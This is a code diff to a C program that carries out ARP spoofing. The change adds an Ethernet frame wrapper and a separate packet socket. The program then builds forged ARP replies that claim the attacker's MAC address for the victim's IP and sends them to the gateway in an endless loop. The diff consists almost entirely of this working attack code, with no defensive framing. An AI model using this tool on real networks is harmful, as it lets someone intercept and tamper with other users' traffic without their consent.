@@ -15,6 +15,11 @@
 #include <netpacket/packet.h>
 #include <netinet/if_ether.h>
 
+struct arp_frame {
+	struct ether_header eth_hdr;
+	struct ether_arp  arp_hdr;
+};
+
 void die(const char *error) {
 	fprintf(stderr, "Error: %s\n", error);
 	exit(EXIT_FAILURE);
@@ -145,31 +150,41 @@ void request_mac(int asfd, const char *if_name, struct ether_arp *req, uint32_t 
 
 }
 
-void arp_spoof(int fd, const char *if_name, const unsigned char *attacker_mac, uint32_t gateway_ip, const unsigned char *gateway_mac, uint32_t victim_ip) {
+void arp_spoof(int rsfd, const char *if_name, const unsigned char *attacker_mac, uint32_t gateway_ip, const unsigned char *gateway_mac, uint32_t victim_ip) {
 	
-    struct ether_arp resp;
+	struct arp_frame resp;
+    // struct ether_arp resp;
 	struct ifreq ifr;
 	set_ifr_name(&ifr, if_name);
 
 	struct sockaddr_ll addr = {0};
 	addr.sll_family         = AF_PACKET;
-	addr.sll_ifindex        = get_ifr_ifindex(fd, &ifr);
-	addr.sll_halen          = ETHER_ADDR_LEN;
+	addr.sll_ifindex        = get_ifr_ifindex(rsfd, &ifr);
+	addr.sll_halen          = ETH_ALEN;
 	addr.sll_protocol       = htons(ETH_P_ARP);
 	memcpy(addr.sll_addr, gateway_mac, ETHER_ADDR_LEN);
 
-	resp.arp_hrd = htons(ARPHRD_ETHER);
-	resp.arp_pro = htons(ETH_P_IP);
-	resp.arp_hln = ETHER_ADDR_LEN;
-	resp.arp_pln = sizeof(in_addr_t);
-	resp.arp_op  = htons(ARPOP_REPLY);
+	memcpy(&resp.eth_hdr.ether_dhost,gateway_mac,sizeof(resp.eth_hdr.ether_dhost));
+	memcpy(&resp.eth_hdr.ether_shost,attacker_mac,sizeof(resp.eth_hdr.ether_shost));
+	resp.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
 
-	memcpy(&resp.arp_sha, attacker_mac, sizeof(resp.arp_sha));
-	memcpy(&resp.arp_spa, &victim_ip,  sizeof(resp.arp_spa));
-	memcpy(&resp.arp_tha, gateway_mac,   sizeof(resp.arp_tha));
-	memcpy(&resp.arp_tpa, &gateway_ip,   sizeof(resp.arp_tpa));
+	resp.arp_hdr.arp_hrd = htons(ARPHRD_ETHER); 
+	resp.arp_hdr.arp_pro = htons(ETH_P_IP);
+	resp.arp_hdr.arp_hln = ETHER_ADDR_LEN;
+	resp.arp_hdr.arp_pln = sizeof(in_addr_t);
+	resp.arp_hdr.arp_op  = htons(ARPOP_REPLY);
 
-	if (sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
+	// resp.arp_hrd = htons(ARPHRD_ETHER);
+	// resp.arp_pro = htons(ETH_P_IP);
+	// resp.arp_hln = ETHER_ADDR_LEN;
+	// resp.arp_pln = sizeof(in_addr_t);
+
+	memcpy(&resp.arp_hdr.arp_sha, attacker_mac, sizeof(resp.arp_hdr.arp_sha));
+	memcpy(&resp.arp_hdr.arp_spa, &victim_ip, sizeof(resp.arp_hdr.arp_spa));
+	memcpy(&resp.arp_hdr.arp_tha, gateway_mac, sizeof(resp.arp_hdr.arp_tha));
+	memcpy(&resp.arp_hdr.arp_tpa, &gateway_ip, sizeof(resp.arp_hdr.arp_tpa));
+
+	if(sendto(rsfd,(void *)&resp, sizeof(resp), 0, (struct sockaddr *)&addr, sizeof(addr)) <= 0) 
 		die(strerror(errno));
 
 }
@@ -184,7 +199,7 @@ int main(int argc, const char* argv[]) {
         exit(EXIT_FAILURE);
     }
 
-    int asfd;
+    int asfd, rsfd;
     struct ifreq ifr;
     struct ether_arp req;
     struct in_addr ip_addr = {0};
@@ -238,8 +253,11 @@ int main(int argc, const char* argv[]) {
     printf("Gateway's MAC Address : ");
     print_mac(gateway_mac);
 
+	if((rsfd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP))) < 0)
+		die(strerror(errno));
+
     while(1) {
-		arp_spoof(asfd, if_name, attacker_mac, gateway_ip, gateway_mac, victim_ip);
+		arp_spoof(rsfd, if_name, attacker_mac, gateway_ip, gateway_mac, victim_ip);
     }
 
 }
